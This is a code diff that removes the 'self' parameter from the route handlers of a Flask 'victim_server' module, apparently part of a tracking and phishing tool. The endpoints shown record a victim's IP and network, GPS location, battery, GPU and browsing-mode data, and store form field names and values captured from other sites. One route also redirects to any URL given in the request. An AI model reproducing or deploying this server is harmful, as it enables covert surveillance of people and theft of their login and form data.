@@ -37,7 +37,7 @@ db = Database()
 
 class victim_server(object):
     @app.route("/" + trape.victim_path)
-    def homeVictim(self):
+    def homeVictim():
         opener = urllib2.build_opener()
         headers = victim_headers(request.user_agent)
         opener.addheaders = headers
@@ -70,7 +70,7 @@ class victim_server(object):
         return html
 
     @app.route("/register", methods=["POST"])
-    def register(self):
+    def register():
         vId = request.form['vId']
         if vId == '':
           vId = utils.generateToken(5)
@@ -102,7 +102,7 @@ class victim_server(object):
         return json.dumps({'status' : 'OK', 'vId' : vId})
 
     @app.route("/nr", methods=["POST"])
-    def networkRegister(self):
+    def networkRegister():
         vId = request.form['vId']
         vIp = request.form['ip']
         vnetwork = request.form['red']
@@ -119,7 +119,7 @@ class victim_server(object):
         return json.dumps({'status' : 'OK', 'vId' : vId})
 
     @app.route("/lr", methods=["POST"])
-    def locationRegister(self):
+    def locationRegister():
         vId = request.form['vId']
         lat = request.form['lat']
         lon = request.form['lon']
@@ -128,7 +128,7 @@ class victim_server(object):
         return json.dumps({'status' : 'OK', 'vId' : vId})
 
     @app.route("/lc", methods=["POST"])
-    def connectionRegister(self):
+    def connectionRegister():
         vId = request.form['vId']
         con = request.form['con']
         host = request.form['host']
@@ -137,7 +137,7 @@ class victim_server(object):
         return json.dumps({'status' : 'OK', 'vId' : vId})
 
     @app.route("/bs", methods=["POST"])
-    def batteryStatusRegister(self):
+    def batteryStatusRegister():
         vId = request.form['id']
         b_data = request.form['d']
         b_type = request.form['t']
@@ -146,7 +146,7 @@ class victim_server(object):
         return json.dumps({'status' : 'OK', 'vId' : vId})
 
     @app.route("/nm", methods=["POST"])
-    def navigationMode(self):
+    def navigationMode():
         vId = request.form['id']
         b_data = request.form['d']
         b_data_2 = request.form['dn']
@@ -155,7 +155,7 @@ class victim_server(object):
         return json.dumps({'status' : 'OK', 'vId' : vId})
 
     @app.route("/rv")
-    def redirectVictim(self):
+    def redirectVictim():
         url = request.args.get('url')
         if url[0:4] != 'http':
             url = 'http://' + url
@@ -166,28 +166,28 @@ class victim_server(object):
         return html
 
     @app.route("/regv", methods=["POST"])
-    def registerRequest(self):
+    def registerRequest():
         vrequest = victim_request(request.form['vId'], request.form['site'], request.form['fid'], request.form['name'], request.form['value'], request.form['sId'])
         db.sentences_victim('insert_requests', [vrequest, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
         utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "=" + utils.Color['white'] + "]" + " " + 'Receiving data from: ' + utils.Color['green'] + vrequest.id + utils.Color['white']  + ' ' + 'on' + ' ' + utils.Color['blue'] + vrequest.site + utils.Color['white'] + '\t\n' + vrequest.fid + '\t' + vrequest.name + ':\t' + vrequest.value)
         return json.dumps({'status' : 'OK', 'vId' : vrequest.id})
 
     @app.route("/tping", methods=["POST"])
-    def receivePiregisterGPUng(self):
+    def receivePiregisterGPUng():
         vrequest = request.form['id']
         db.sentences_victim('report_online', [vrequest], 2)
         db.sentences_victim('update_lastping', [vrequest, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
         return json.dumps({'status' : 'OK', 'vId' : vrequest})
 
     @app.route("/cIp", methods=["POST"])
-    def changeLocalIp(self):
+    def changeLocalIp():
         vrequest = request.form['id']
         vIp = request.form['ip']
         db.sentences_victim('update_localIp', [vrequest, vIp], 2)
         return json.dumps({'status' : 'OK', 'vId' : vrequest})
 
     @app.route("/gGpu", methods=["POST"])
-    def setGpuInfo(self):
+    def setGpuInfo():
         vId = request.form['vId']
         vData = request.form['data']
         db.sentences_victim('update_gpu', [vId, vData], 2)
